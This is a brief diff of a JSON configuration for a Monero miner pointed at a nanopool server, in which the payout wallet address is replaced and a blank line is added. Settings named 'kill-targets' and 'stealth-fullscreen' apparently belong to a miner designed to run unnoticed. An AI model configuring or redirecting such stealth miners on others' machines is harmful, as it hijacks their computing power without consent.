@@ -2,7 +2,7 @@
     "algo": "rx/0",
     "pool": "xmr-asia1.nanopool.org",
     "port": 10343,
-    "wallet": "48LzVEivaesa8kHDbpU3BiLX9wiv11GdNB4Ji6PVZFWB5fMFvZTrqRn5bUo2VRB7oAQDvHztzx5Ma8WHWKHevK8A6smyppv",
+    "wallet": "44SC1Wk3tmZeVr6LvcaVcsZbnYCT5hUVWe4ptAPE445NWhcYUvkShPuJiYkxi5yofgdTWqPUCCNdcBar18Kecbgs15gRzhk",
     "password": "",
     "nicehash": false,
     "ssltls": true,
@@ -13,6 +13,7 @@
     "kill-targets": "",
     "stealth-fullscreen": false
 }
+
 
 
 
